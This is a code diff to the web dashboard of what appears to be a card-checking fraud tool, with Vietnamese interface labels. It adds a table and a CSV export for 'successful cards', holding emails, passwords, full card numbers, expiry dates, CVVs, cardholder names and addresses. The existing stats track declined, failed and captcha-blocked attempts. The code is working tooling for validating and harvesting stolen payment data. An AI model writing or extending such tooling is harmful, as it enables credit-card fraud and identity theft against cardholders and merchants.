@@ -372,7 +372,8 @@ input:focus,select:focus,textarea:focus{border-color:var(--accent);}
     <h2>Dashboard</h2>
     <div class="spacer"></div>
     <button class="btn btn-ghost btn-sm" onclick="loadDashboard()">🔄 Refresh</button>
-    <button class="btn btn-ghost btn-sm" onclick="exportDeclinedCSV()">⬇ Export CSV</button>
+    <button class="btn btn-ghost btn-sm" onclick="exportSuccessCSV()">⬇ Export Thành Công</button>
+    <button class="btn btn-ghost btn-sm" onclick="exportDeclinedCSV()">⬇ Export Declined</button>
     <button class="btn btn-warn btn-sm" onclick="clearDeclined()">🗑 Xoá Declined</button>
   </div>
 
@@ -383,6 +384,19 @@ input:focus,select:focus,textarea:focus{border-color:var(--accent);}
     <div class="stat-card" id="stat-declined"><div class="stat-val" id="sv-declined">—</div><div class="stat-lbl">Declined</div></div>
     <div class="stat-card" id="stat-failed"><div class="stat-val" id="sv-failed">—</div><div class="stat-lbl">Thất bại</div></div>
     <div class="stat-card" id="stat-captcha"><div class="stat-val" id="sv-captcha">—</div><div class="stat-lbl">Captcha Block</div></div>
+  </div>
+
+  <!-- Success records table -->
+  <h3 style="margin-bottom:10px;font-size:.92rem;color:#4dffa0;text-transform:uppercase;letter-spacing:.05em;">✅ Thẻ Thành Công</h3>
+  <div class="table-wrap" style="margin-bottom:28px;overflow-x:auto;">
+    <table id="dash-success-table">
+      <thead><tr>
+        <th>Timestamp</th><th>Email</th><th>Password</th><th>Card Number</th><th>Exp Month</th><th>Exp Year</th><th>CVV</th><th>Cardholder</th><th>Address</th><th>City</th><th>State</th><th>ZIP</th>
+      </tr></thead>
+      <tbody id="dash-success-body">
+        <tr><td colspan="12" style="text-align:center;color:var(--muted);padding:20px;">Chưa có dữ liệu</td></tr>
+      </tbody>
+    </table>
   </div>
 
   <!-- Declined records table -->
@@ -1735,6 +1749,31 @@ async function loadDashboard() {
     document.getElementById('sv-failed').textContent   = s.failed         ?? 0;
     document.getElementById('sv-captcha').textContent  = s.captcha_blocked?? 0;
 
+    // Success table
+    const stbody = document.getElementById('dash-success-body');
+    const srecs  = (d.success_records || []).slice().reverse(); // mới nhất lên trên
+    _successRows = d.success_records || []; // lưu để export
+    if (srecs.length === 0) {
+      stbody.innerHTML = '<tr><td colspan="12" style="text-align:center;color:var(--muted);padding:20px;">Chưa có dữ liệu</td></tr>';
+    } else {
+      stbody.innerHTML = srecs.map(rec => {
+        return `<tr style="background:rgba(77,255,160,0.04)">
+          <td style="font-size:.75rem;color:var(--muted);white-space:nowrap">${escHtml(rec.timestamp||'—')}</td>
+          <td style="color:#4dffa0;font-weight:600">${escHtml(rec.email||'—')}</td>
+          <td style="color:var(--muted)">${escHtml(rec.password||'—')}</td>
+          <td style="font-family:'JetBrains Mono',monospace;font-size:.82rem;color:#4dffa0;font-weight:700">${escHtml(rec.card||'—')}</td>
+          <td style="text-align:center">${escHtml(rec.exp_month||'—')}</td>
+          <td style="text-align:center">${escHtml(rec.exp_year||'—')}</td>
+          <td style="text-align:center;color:var(--muted)">${escHtml(rec.cvv||'—')}</td>
+          <td>${escHtml(rec.cardholder||'—')}</td>
+          <td style="font-size:.78rem">${escHtml(rec.address||'—')}</td>
+          <td>${escHtml(rec.city||'—')}</td>
+          <td>${escHtml(rec.state||'—')}</td>
+          <td>${escHtml(rec.zip||'—')}</td>
+        </tr>`;
+      }).join('');
+    }
+
     // Declined table
     const tbody = document.getElementById('dash-declined-body');
     const recs  = (d.declined_records || []).slice().reverse(); // mới nhất lên trên
@@ -1793,6 +1832,7 @@ function escHtml(s) {
 
 // ── CSV export helpers ──────────────────────────────────────────────────────
 let _declinedRows = [];
+let _successRows  = [];
 
 function csvEscape(v) {
   const s = String(v == null ? '' : v);
@@ -1833,6 +1873,15 @@ async function exportResultCSV() {
     downloadCSV('result_export.csv', headers, allRows.map(r => ({...r, card_number: r.card_number || r.card || ''})));
     showToast(`Đã xuất ${allRows.length} dòng → result_export.csv`,'ok');
   } catch(e) { showToast('Lỗi export result','err'); }
+}
+
+async function exportSuccessCSV() {
+  try {
+    if (!_successRows.length) { showToast('Chưa có thẻ thành công','err'); return; }
+    const headers = ['timestamp','email','password','card','exp_month','exp_year','cvv','cardholder','address','city','state','zip'];
+    downloadCSV('success_export.csv', headers, _successRows);
+    showToast('Đã xuất success_export.csv','ok');
+  } catch(e) { showToast('Lỗi export','err'); }
 }
 
 async function exportDeclinedCSV() {
